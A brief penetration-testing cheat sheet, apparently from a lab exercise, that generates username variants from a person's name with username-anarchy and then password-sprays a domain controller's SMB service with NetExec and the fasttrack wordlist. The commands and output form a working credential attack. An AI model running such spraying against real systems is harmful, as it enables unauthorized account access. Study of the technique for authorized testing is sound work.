# Custom Usernames

## Creating a List

```sh
my@attack:~$ echo "John Marston" | tee names.txt
```

```output title="Output"
John Marston
```

## [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

```sh
my@attack:~$ username-anarchy -i names.txt | tee usernames.txt
```

```output title="Output"
john
johnmarston
john.marston
johnmars
johnm
j.marston
jmarston
mjohn
m.john
marstonj
marston
marston.j
marston.john
jm
```

## [Attacking](https://www.netexec.wiki/smb-protocol/password-spraying) the Domain Controller

```sh
my@attack:~$ sudo nxc smb 10.129.202.85 -u usernames.txt -p /usr/local/share/wordlists/fasttrack.txt
```
